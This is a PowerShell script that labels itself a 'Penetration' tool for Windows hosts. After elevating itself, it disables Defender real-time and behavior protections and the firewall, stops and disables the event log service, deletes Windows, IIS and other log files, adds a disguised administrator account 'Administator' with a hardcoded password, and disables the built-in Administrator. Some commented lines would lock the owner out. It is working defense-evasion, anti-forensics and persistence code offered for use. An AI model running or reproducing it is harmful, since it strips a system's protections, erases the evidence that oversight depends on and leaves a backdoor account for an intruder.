Function checkRunAsAdministrator()
{
  #Get current user context
  $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
  
  #Check user is running the script is member of Administrator Group
  if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
  {
       return $true
  }
  else
    {
       #Create a new Elevated process to Start PowerShell
       $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
 
       # Specify the current script path and name as a parameter
       $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
 
       #Set the Process to elevated
       $ElevatedProcess.Verb = "runas"
 
       #Start the new elevated process
       [System.Diagnostics.Process]::Start($ElevatedProcess)
 
       #Exit from the current, unelevated, process
       Exit
 
    }
}

#check if a path exists
Function checkIfFolderExists {
     param(
        [string]$FolderPath
    )

    if (Test-Path -Path $FolderPath) {
        Write-Host "Folder " + $FolderPath + " exists."
        return $true
    }
    Write-Host "Folder " + $FolderPath + " does not exists."
    return $false
}

Function removeLogFilesFromAFolder {
     param(
        [string]$FolderPath
    )

    if(checkIfFolderExists -Folderpath $FolderPath) {
        Write-Host "Initiaing file deletion on " + $FolderPath
        $FolderPathWithFileExtension = $FolderPath + "\*.*"
        Remove-Item $FolderPathWithFileExtension
        Write-Host "File deleted from " + $FolderPath
    }
}

Write-Host "Validating Administrative permissions ..."
 
#Check Script is running with Elevated Privileges
if(checkRunAsAdministrator) {
    Write-Host "Initated Penetration ..."

    # Disabled Windows Defender
    # Run this before the script
    Write-Host "Disabling Firewalls .."
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true
    
    # Disabled Firewalld
    Set-NetFirewallProfile -Enabled False

    Write-Host "Firewall Dsiabled"

    #Disabled the EventLog Service
    Write-Host "Disabling System EventLog Service..."
    Set-Service -Name eventlog -StartupType Disabled
    Stop-Service -Name eventlog -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 0 -Type DWord
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application" -Name "Start" -Value 4 -Type DWord

    Write-Host "Event Log Service Disabled"

    # Decreased max size of event log application to 10KB
    $eventLog = New-Object System.Diagnostics.EventLog("Application")
    $eventLog.MaximumKilobytes = 64
    $eventLog.ModifyOverflowPolicy("OverwriteAsNeeded", 0)

    Write-Host "System Log Size Reduced to 64 byte"


    #Removed all the log files
    Write-Host "Removing System and Event Log Files..."

    removeLogFilesFromAFolder -Folderpath "C:\Logs"
    removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
    removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"

    # Updated current user password to kick them out of their account
    #Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force)
    #Rename-LocalUser -Name "Administrator" -NewName "Admin"

    # Create new user with Admin privilages

    Write-Host "Creating new user with admin privilage.."
    New-LocalUser -Name "Administator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force) -FullName "Administrator" -Description "" -AccountNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member "Administator"
    Write-Host "New User Created"

    # Disable the "Administrator" account
    Write-Host "Disabling built-in Administrator user"
    net user Administrator /active:no

    #Enabled Firewalld
    #Set-NetFirewallProfile -Enabled True

    #Enabled the EventLog Service
    #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 1 -Type DWord
    #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application" -Name "Start" -Value 2 -Type DWord
}
